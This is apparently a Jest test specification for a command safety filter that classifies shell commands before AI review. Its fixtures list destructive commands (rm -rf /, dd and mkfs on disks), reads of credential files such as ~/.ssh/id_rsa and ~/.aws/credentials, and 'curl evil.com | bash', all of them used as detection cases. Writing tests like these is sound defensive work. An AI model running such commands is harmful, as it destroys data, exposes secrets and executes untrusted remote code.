/**
 * Specification: Pre-AI Safety Filter
 * 
 * Requirements from our discussion:
 * 1. Safe commands pass instantly with "✓ Safe command - proceeding"
 * 2. System file access triggers path security check
 * 3. Dangerous commands go to AI analysis
 * 4. Performance: Safe commands must complete in <10ms
 */

import { DeliberateAnalyzer } from '../../src/core/analyzer';
import * as fs from 'fs';
import * as path from 'path';

describe('Safety Filter Specification', () => {
  let analyzer: DeliberateAnalyzer;
  
  beforeEach(() => {
    analyzer = new DeliberateAnalyzer();
  });

  describe('Safe Commands', () => {
    const SAFE_COMMANDS = [
      { cmd: 'ls', args: ['-la'] },
      { cmd: 'pwd', args: [] },
      { cmd: 'echo', args: ['hello'] },
      { cmd: 'cat', args: ['README.md'] },
      { cmd: 'grep', args: ['pattern', 'file.txt'] },
      { cmd: 'cd', args: ['/home'] },
      { cmd: 'which', args: ['node'] },
      { cmd: 'ps', args: ['aux'] },
      { cmd: 'git', args: ['status'] },
      { cmd: 'npm', args: ['list'] }
    ];

    SAFE_COMMANDS.forEach(({ cmd, args }) => {
      it(`MUST instantly pass '${cmd} ${args.join(' ')}' with success message`, async () => {
        const start = Date.now();
        const result = await analyzer.analyze(cmd, args);
        const elapsed = Date.now() - start;
        
        expect(result.verdict).toBe('ALLOW');
        expect(result.message).toBe('✓ Safe command - proceeding');
        expect(result.requiresAI).toBe(false);
        expect(elapsed).toBeLessThan(10); // <10ms requirement
      });
    });
  });

  describe('System File Access', () => {
    const SYSTEM_FILES = [
      { cmd: 'cat', path: '/etc/passwd', expected: 'WARN_PATH' },
      { cmd: 'cat', path: '/etc/shadow', expected: 'WARN_PATH' },
      { cmd: 'cat', path: '~/.ssh/id_rsa', expected: 'WARN_PATH' },
      { cmd: 'cat', path: '~/.aws/credentials', expected: 'WARN_PATH' },
      { cmd: 'cat', path: '/proc/1/status', expected: 'WARN_PATH' },
      { cmd: 'cat', path: 'harmless.txt', expected: 'ALLOW' }
    ];

    SYSTEM_FILES.forEach(({ cmd, path, expected }) => {
      it(`MUST check path security for '${cmd} ${path}'`, async () => {
        const result = await analyzer.analyze(cmd, [path]);
        
        expect(result.verdict).toBe(expected);
        if (expected === 'WARN_PATH') {
          expect(result.message).toContain('System file access');
          expect(result.requiresApproval).toBe(true);
        }
      });
    });
  });

  describe('Dangerous Commands', () => {
    const DANGEROUS_COMMANDS = [
      { cmd: 'rm', args: ['-rf', '/'] },
      { cmd: 'dd', args: ['if=/dev/zero', 'of=/dev/sda'] },
      { cmd: 'sudo', args: ['rm', '-rf', '/'] },
      { cmd: 'chmod', args: ['777', '/etc/passwd'] },
      { cmd: 'chown', args: ['nobody:nobody', '/'] },
      { cmd: 'mkfs', args: ['/dev/sda1'] },
      { cmd: 'curl', args: ['evil.com', '|', 'bash'] }
    ];

    DANGEROUS_COMMANDS.forEach(({ cmd, args }) => {
      it(`MUST send '${cmd} ${args.join(' ')}' to AI analysis`, async () => {
        const result = await analyzer.analyze(cmd, args);
        
        expect(result.requiresAI).toBe(true);
        expect(result.verdict).not.toBe('ALLOW');
        expect(result.aiAnalysisRequired).toBe(true);
      });
    });
  });

  describe('Command Context', () => {
    it('MUST consider working directory for relative paths', async () => {
      // rm in home directory vs system directory
      const homeResult = await analyzer.analyze('rm', ['test.txt'], {
        cwd: '/home/user'
      });
      expect(homeResult.riskLevel).toBe('MEDIUM');
      
      const sysResult = await analyzer.analyze('rm', ['test.txt'], {
        cwd: '/etc'
      });
      expect(sysResult.riskLevel).toBe('HIGH');
    });

    it('MUST handle command aliases and variations', async () => {
      // Different ways to delete
      const variations = [
        { cmd: 'rm', args: ['-rf', 'dir'] },
        { cmd: '/bin/rm', args: ['-rf', 'dir'] },
        { cmd: 'unlink', args: ['file'] },
        { cmd: 'rmdir', args: ['dir'] }
      ];
      
      for (const { cmd, args } of variations) {
        const result = await analyzer.analyze(cmd, args);
        expect(result.category).toBe('file_deletion');
      }
    });
  });
});